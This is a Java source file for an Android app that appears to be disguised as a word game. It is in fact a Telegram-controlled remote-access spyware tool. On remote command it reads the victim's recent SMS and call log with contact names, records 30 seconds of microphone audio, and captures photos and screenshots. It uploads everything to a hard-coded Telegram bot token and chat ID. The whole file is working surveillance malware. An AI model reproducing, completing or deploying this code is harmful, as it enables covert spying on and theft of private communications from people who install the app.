package com.silent.telebot;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class TelegramPoller implements Runnable {
    private Context ctx;

    // ⚠️ ضع التوكن و CHAT_ID الصحيحين هنا ⚠️
    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";
    private static final String CHAT_ID = "7058836561";

    private static int lastUpdateId = 0;

    public TelegramPoller(Context ctx) {
        this.ctx = ctx;
    }

    @Override
    public void run() {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(35000);
            conn.setReadTimeout(35000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) response.append(line);
            reader.close();
            conn.disconnect();

            JSONObject jsonResponse = new JSONObject(response.toString());
            if (jsonResponse.getBoolean("ok")) {
                JSONArray updates = jsonResponse.getJSONArray("result");
                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getInt("update_id");
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String text = message.optString("text", "");
                        handleCommand(text);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("TelegramPoller", "خطأ: " + e.getMessage());
        }
    }

    private void handleCommand(String cmd) {
        try {
            if (cmd.equals("/help")) {
                sendMessage("📋 الأوامر:\n" +
                        "/get_sms - عرض آخر 10 رسائل\n" +
                        "/get_calls - عرض آخر 10 مكالمات\n" +
                        "/take_pic - التقاط صورة\n" +
                        "/record - تسجيل صوتي (30 ثانية)\n" +
                        "/screenshot - لقطة شاشة\n" +
                        "/play - فتح اللعبة");
            }
            else if (cmd.equals("/get_sms")) {
                sendMessage(getSms());
            }
            else if (cmd.equals("/get_calls")) {
                sendMessage(getCalls());
            }
            else if (cmd.equals("/take_pic")) {
                capturePhoto();
            }
            else if (cmd.equals("/record")) {
                startRecording();
            }
            else if (cmd.equals("/screenshot")) {
                ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
            }
            else if (cmd.equals("/play")) {
                Intent intent = new Intent(ctx, WordOrderActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                sendMessage("🎮 تم فتح اللعبة!");
            }
            else {
                sendMessage("❌ أمر غير معروف. استخدم /help");
            }
        } catch (Exception e) {
            sendMessage("❌ خطأ: " + e.getMessage());
        }
    }

    // ============================================================
    //  📩 جلب الرسائل النصية
    // ============================================================
    private String getSms() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {
            return "❌ نظامك لا يدعم قراءة الرسائل.";
        }
        ContentResolver cr = ctx.getContentResolver();
        Cursor cursor = null;
        try {
            cursor = cr.query(Telephony.Sms.Inbox.CONTENT_URI,
                    new String[]{"address", "body", "date"},
                    null, null, "date DESC LIMIT 10");

            if (cursor == null || !cursor.moveToFirst()) {
                return "📭 لا توجد رسائل.";
            }

            StringBuilder sb = new StringBuilder("📩 آخر 10 رسائل\n━━━━━━━━━━━━━━━━━━\n");
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM HH:mm", Locale.getDefault());

            do {
                String address = cursor.getString(0);
                String body = cursor.getString(1);
                long date = cursor.getLong(2);
                String name = getContactName(address);
                String display = (name != null) ? name : address;
                sb.append("👤 ").append(display).append("\n");
                sb.append("📝 ").append(body).append("\n");
                sb.append("🕐 ").append(sdf.format(new Date(date))).append("\n");
                sb.append("━━━━━━━━━━━━━━━━━━\n");
            } while (cursor.moveToNext());

            return sb.toString();

        } catch (SecurityException e) {
            return "❌ صلاحية الرسائل غير ممنوحة.";
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    // ============================================================
    //  📞 جلب سجل المكالمات
    // ============================================================
    private String getCalls() {
        ContentResolver cr = ctx.getContentResolver();
        Cursor cursor = null;
        try {
            cursor = cr.query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE},
                    null, null, CallLog.Calls.DATE + " DESC LIMIT 10");

            if (cursor == null || !cursor.moveToFirst()) {
                return "📭 لا توجد مكالمات.";
            }

            StringBuilder sb = new StringBuilder("📞 آخر 10 مكالمات\n━━━━━━━━━━━━━━━━━━\n");
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM HH:mm", Locale.getDefault());

            do {
                String number = cursor.getString(0);
                long date = cursor.getLong(1);
                long duration = cursor.getLong(2);
                int type = cursor.getInt(3);
                String name = getContactName(number);
                String display = (name != null) ? name : number;
                String typeStr = (type == CallLog.Calls.INCOMING_TYPE) ? "📥 وارد" :
                                 (type == CallLog.Calls.OUTGOING_TYPE) ? "📤 صادر" : "❌ فائتة";
                sb.append("👤 ").append(display).append("\n");
                sb.append("📌 ").append(typeStr).append("\n");
                sb.append("⏱️ ").append(duration).append(" ثانية\n");
                sb.append("🕐 ").append(sdf.format(new Date(date))).append("\n");
                sb.append("━━━━━━━━━━━━━━━━━━\n");
            } while (cursor.moveToNext());

            return sb.toString();

        } catch (SecurityException e) {
            return "❌ صلاحية سجل المكالمات غير ممنوحة.";
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    // ============================================================
    //  📷 التقاط صورة (كاميرا)
    // ============================================================
    private void capturePhoto() {
        try {
            File photoFile = new File(ctx.getCacheDir(), "temp_photo.jpg");
            if (photoFile.exists()) photoFile.delete();
            Uri photoUri = androidx.core.content.FileProvider.getUriForFile(ctx,
                    ctx.getPackageName() + ".fileprovider", photoFile);

            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            intent.putExtra(MediaStore.EXTRA_OUTPUT, photoUri);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            ctx.startActivity(intent);

            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                if (photoFile.exists() && photoFile.length() > 0) {
                    sendPhotoStatic(CHAT_ID, photoFile, BOT_TOKEN);
                } else {
                    sendMessage("❌ فشل التقاط الصورة.");
                }
            }, 5000);

        } catch (Exception e) {
            sendMessage("❌ خطأ في الكاميرا: " + e.getMessage());
        }
    }

    // ============================================================
    //  🎤 تسجيل صوتي
    // ============================================================
    private void startRecording() {
        try {
            File audioFile = new File(ctx.getCacheDir(), "recording.m4a");
            if (audioFile.exists()) audioFile.delete();

            android.media.MediaRecorder recorder = new android.media.MediaRecorder();
            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            sendMessage("🎙️ بدأ التسجيل لمدة 30 ثانية...");

            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                try {
                    recorder.stop();
                    recorder.release();
                    if (audioFile.exists() && audioFile.length() > 0) {
                        sendAudioStatic(CHAT_ID, audioFile, BOT_TOKEN);
                    } else {
                        sendMessage("❌ فشل التسجيل (الملف فارغ).");
                    }
                } catch (Exception e) {
                    sendMessage("❌ خطأ في التسجيل: " + e.getMessage());
                }
            }, 30000);

        } catch (Exception e) {
            sendMessage("❌ صلاحية الميكروفون غير ممنوحة.");
        }
    }

    // ============================================================
    //  📤 دوال إرسال الملفات (ثابتة)
    // ============================================================
    public static void sendPhotoStatic(String chatId, File photoFile, String botToken) {
        try {
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
            dos.writeBytes(lineEnd);
            dos.writeBytes(chatId + lineEnd);

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + photoFile.getName() + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            FileInputStream fileInputStream = new FileInputStream(photoFile);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    public static void sendAudioStatic(String chatId, File audioFile, String botToken) {
        try {
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendAudio");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
            dos.writeBytes(lineEnd);
            dos.writeBytes(chatId + lineEnd);

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"" + audioFile.getName() + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            FileInputStream fileInputStream = new FileInputStream(audioFile);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    public static void sendMessageStatic(String chatId, String text) {
        try {
            String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + chatId +
                    "&text=" + encodedText;
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    // ============================================================
    //  🔍 مساعدات
    // ============================================================
    private String getContactName(String number) {
        if (number == null) return null;
        try {
            ContentResolver cr = ctx.getContentResolver();
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
            Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(0);
                cursor.close();
                return name;
            }
        } catch (Exception ignored) {}
        return null;
    }

    private void sendMessage(String text) {
        try {
            String encoded = java.net.URLEncoder.encode(text, "UTF-8");
            String url = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encoded;
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }
}
